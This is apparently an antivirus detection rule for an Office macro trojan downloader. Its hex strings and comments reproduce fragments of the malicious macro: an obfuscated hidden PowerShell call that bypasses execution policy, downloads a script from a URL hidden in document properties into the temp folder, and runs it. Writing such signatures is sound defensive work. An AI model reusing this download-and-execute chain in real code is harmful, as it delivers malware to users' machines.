
rule TrojanDownloader_O97M_Obfuse_ABA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.ABA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {6f 53 68 65 6c 6c 20 3d 20 22 63 6d 64 20 2f 4b 20 22 20 2b 20 22 70 6f 77 22 20 2b 20 22 65 72 22 20 2b 20 22 53 68 22 20 2b 20 22 65 6c 6c 2e 65 22 20 2b 20 22 78 22 20 2b 20 22 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 4e 20 2d 45 78 65 63 75 54 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 53 20 2d 6e 6f 70 72 6f 66 69 6c 65 20 } //1 oShell = "cmd /K " + "pow" + "er" + "Sh" + "ell.e" + "x" + "e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile 
		$a_01_1 = {28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 22 20 2b 20 42 61 73 65 36 34 44 65 63 6f 64 65 28 43 61 74 65 67 6f 72 79 20 2b 20 4c 61 6e 67 75 61 67 65 20 2b 20 4b 65 79 77 6f 72 64 73 20 2b 20 43 6f 6d 6d 65 6e 74 73 29 20 2b } //1 (New-Object System.Net.WebClient).DownloadFile('http://" + Base64Decode(Category + Language + Keywords + Comments) +
		$a_01_2 = {2f 66 69 6c 65 2e 74 78 74 27 2c 27 25 54 45 4d 50 25 5c 59 6c 6f 61 64 2e 70 73 31 27 29 3b 20 70 6f 57 65 72 53 68 45 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 4e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 2d 6e 6f 70 72 6f 66 69 6c 65 20 2d 66 69 6c 65 20 25 54 45 4d 50 25 5c 59 6c 6f 61 64 2e 70 73 31 22 } //1 /file.txt','%TEMP%\Yload.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Yload.ps1"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}